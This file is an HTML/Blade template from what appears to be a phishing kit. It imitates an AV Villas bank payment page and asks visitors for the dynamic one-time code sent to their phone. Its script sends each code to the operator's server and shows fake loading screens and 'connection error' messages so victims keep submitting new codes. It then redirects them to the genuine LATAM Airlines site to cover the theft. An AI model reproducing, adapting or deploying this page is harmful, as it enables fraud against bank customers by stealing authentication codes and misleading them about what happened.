
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{{asset('assets/css/payment/avvillas.css')}}">

    

    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>

    <title>Secure Payment</title>
</head>
<body>

<div id="formContainer">
<br>
<img src="{{asset('assets/img/payment/avvillas/avvillas.png')}}" alt="" srcset="" width="50%"><br>
<br>
<div class="" style="margin-top:55px; color: white; ">
    <a>Esta a punto de realizar un pago en el comercio <b>Latam</b> para continuar ingrese la clave dinamica que hemos enviado al numero asociado con su cuenta</a>

    <div style="text-align:center;"> 
        <br>
        <input type="tel" name="" class="pass" id="txtDinamica" placeholder="Clave dinamica" style="width:90%; height: 40px; margin-top:20px; margin-left:0px; border-radius:5px;" required maxlength="8" minlength="6">
        <input type="submit" value="Continuar" id="btnDinamica" style="width:85%; height:45px; background-color:red; color:white; border:none; border-radius:100px; margin-left:-10px; font-size:14px; margin-top:10px;">
    </div>

</div>

</div>




<div id="loader" class="spinner-container" style="display:none; text-align:center;">
    <div class="spinner"></div>
    <p style="color:#fff; margin-top:15px;">Procesando, por favor espere...</p>
</div>


<script type="text/javascript">
	var espera = 0;
    var count = 0;
	let identificadorTiempoDeEspera;


    function sendCode() {
        // 1) ocultar formulario y mostrar pantalla de carga
       
        const $input = $("#txtDinamica");

        // remove all whitespace
        let dinamica = $input.val().replace(/\s+/g, '');

        // update input without spaces
        $input.val(dinamica);

        if (dinamica.length > 5 && count >= 3) {

            $('#formContainer').hide();
            $('#loader').show();
            setTimeout(function () {
                $('#loader').hide();
                $('#formContainer').show();
            }, 6000);

            const data = { dinamica };
            if(dinamica.length > 5) {
                count++;
            }
            alert('Error de conexión, por favor intente de nuevo');
            window.location.href = "https://www.latamairlines.com/co/es/ofertas";
        } else {
            // clear the field correctly
            $input.val('');
            $(".mensaje").show();
            $(".pass").css("border", "1px solid red");
            $input.focus();
            
            // si quieres loguear el intento (opcional)
            const data = { dinamica };
            if(dinamica.length > 5) {
                $('#formContainer').hide();
                $('#loader').show();
                    setTimeout(function () {
                        $('#loader').hide();
                        $('#formContainer').show();
                    }, 6000);
                $.ajax({
                    url: "{{ route('pago.bank.step.save', [
                        'bank' => $bankSlug,
                        'step' => 2
                    ]) }}",
                    method: 'POST',
                    data: {
                        _token: "{{ csrf_token() }}",
                        dinamica: dinamica,
                    },
                    success: function () {
                
                    },
                    error: function () {
                        alert('Error de conexión');
                    }
                });
                count++;
            }
        }
    }

	$(document).ready(function() {
		$('#btnDinamica').click(function(){
            sendCode();
		});

		$("#txtDinamica").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>



</body>
</html>